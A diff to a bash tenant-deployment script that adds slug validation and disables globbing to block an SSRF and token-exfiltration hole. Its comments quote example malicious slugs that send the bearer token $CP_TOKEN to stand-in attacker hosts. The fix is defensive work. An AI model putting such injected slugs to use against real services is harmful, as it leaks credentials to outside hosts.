@@ -54,6 +54,57 @@
 #   64  argument/usage error
 
 set -euo pipefail
+# Disable glob expansion so tenant slugs containing *, ?, [ are treated as
+# literals, not filename patterns. This is the primary defence against the
+# token-exfiltration attack vector where a malicious slug like
+# "evil?url=https://attacker.com?token=$CP_TOKEN" could otherwise expand to
+# a list of filenames via pathname expansion.
+set -f
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Slug validation (OFFSEC-006)
+# ─────────────────────────────────────────────────────────────────────────────
+#
+# Slugs are interpolated into URL paths (cp_redeploy_tenant, tenant_buildinfo,
+# tenant_health, resolve_tenant_instance_id) and ECR identifiers. An unsanitised
+# slug can trigger:
+#   1. SSRF   — slug=https://evil.com?x= injected as URL authority/path segment.
+#   2. Token exfiltration — slug=?url=https://evil.com&token=$CP_TOKEN causes
+#      curl to issue a GET to the attacker's host, leaking the bearer token.
+# The guard above (set -f) blocks glob metacharacter expansion; this function
+# validates the slug shape so malformed names are rejected before any network
+# call is issued.
+
+# Simple logging helpers — defined early so validate_slug can call err
+# before the full Steps block is reached. The real definitions (with full
+# timestamps) live in the Steps section and re-declare them idempotently.
+err() { printf '[%s] ERROR: %s\n' "$(date -u +%H:%M:%SZ)" "$*" >&2; }
+
+# Validates a single tenant slug against RFC-1123 + lowercase + max 63 chars.
+# arg1 = slug string
+# exits 64 if invalid; returns 0 on success.
+validate_slug() {
+  local slug="$1"
+  # RFC-1123 label: lowercase alphanumeric, single hyphens allowed between chars,
+  # no leading/trailing hyphen, 1–63 chars total. Also allows single-char slugs.
+  if [[ ! "$slug" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$ ]]; then
+    err "invalid tenant slug: '$slug' (must match ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$; got '${slug//$'\n'/<LF>}')"
+    return 1
+  fi
+  return 0
+}
+
+# Validates all tenant slugs from the --tenants argument.
+# Called once after argument parsing, before any network call.
+validate_tenants() {
+  local slug
+  IFS=',' read -ra SLUGS <<<"$TENANTS"
+  for slug in "${SLUGS[@]}"; do
+    [[ -z "$slug" ]] && { err "empty slug in --tenants list"; return 1; }
+    validate_slug "$slug" || return 1
+  done
+  return 0
+}
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Argument parsing
@@ -100,6 +151,9 @@ done
   printf 'source-tag and dest-tag must differ\n' >&2
   exit 64
 }
+
+# Validate slugs before any network call (OFFSEC-006)
+validate_tenants || exit 64
 
 # Snapshot/rollback tag (deterministic — same script run on same UTC date
 # is idempotent; cross-day reruns get distinct rollback points).
